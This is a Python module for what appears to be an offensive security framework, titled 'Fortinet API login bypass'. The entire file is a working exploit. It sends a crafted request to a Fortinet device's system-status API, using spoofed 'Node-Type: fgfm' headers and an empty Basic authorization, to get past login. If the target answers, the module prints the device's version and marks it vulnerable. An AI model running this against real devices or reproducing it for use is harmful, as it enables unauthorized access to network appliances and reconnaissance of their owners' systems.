import urllib3
import sys
import smf
from lib.smf.ssl.netssl import *

MOD_INFO = {
    "Name": "Fortinet API login bypass",
    "Description": """
Attempting to bypass the Fortinet login API using
vulnerability from cve that was discovered publicly,
and just do a check, if it goes through then the output
will release the version of Fortinet that is used.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["Bypass", {"Description": "Breaking in without username & password"}],
    ],
    "DefaultAction": "Bypass",
    "License": "SMF License",
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
REQUIRED_OPTIONS = {"URL": ""}


def execute(options):
    target = options.get("URL")
    port = 443

    url = f"https://{target}:{port}/api/v2/monitor/system/status"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Node-Id": "1",
        "Node-Type": "fgfm",
        "Authorization": "Basic Og==",
    }

    try:
        res = storm_ssl("GET", url, headers=headers)
        if res.status_code == 200 and "version" in res.text.lower():
            smf.printf(f"{'='*40}")
            smf.printf(f"[!] VULNERABLE: {target}")
            smf.printf(
                f"[+] System Info: {res.json().get('results', {}).get('version', 'N/A')}"
            )
            smf.printf(f"{'='*40}")
        else:
            smf.printf("[-] Target not vulnerable or patched.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        smf.printf(f"[-] GLOBAL ERROR =>", e, file=sys.stderr, flush=True)
